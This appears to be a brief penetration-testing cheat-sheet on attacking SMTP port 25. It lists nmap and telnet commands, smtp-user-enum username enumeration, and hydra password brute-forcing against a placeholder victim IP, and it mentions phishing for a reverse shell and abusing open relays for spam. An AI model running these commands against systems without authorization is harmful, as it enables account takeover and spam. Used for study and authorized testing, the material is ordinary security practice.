# <span style="color:#FF5555">Port - 25</span>

 - `You can send phishing email with this port to get reverse shell.`
 - `Used to send, receive, and relay outgoing emails and Main attacks are user enumeration and using an open relay to send spam`
- `always login with telnet $VICTIM_IP 25`

 ```bash
 nmap $VICTIM_IP --script=smtp* -p 25  # Scan for SMTP info & vulns
 telnet $VICTIM_IP 25                   # Manual SMTP login
 ```


### <span style="color:#50FA7B">Enumeration Users :</span>
https://www.kali.org/tools/smtp-user-enum/#smtp-user-enum
if you have users list

```bash
# run this command and look for status code 252
smtp-user-enum -m VRFY -U usernames.txt $VICTIM_IP 25 

# OR
smtp-user-enum -m VRFY -U usernames.txt $VICTIM_IP 25 | grep "252"

# OR
# https://github.com/cytopia/smtp-user-enum

./smtp-user-enum -m RCPT -d $DOMAIN -U /home/ghost/temp/users.list  $VICTIM_IP 25

# OR
hydra -l '<USERNAME>@<DOMAIN>' -P passwords.list -f $VICTIM_IP pop3
hydra -l 'marlin@$DOMAIN' -P passwords.list -f $VICTIM_IP pop3
```
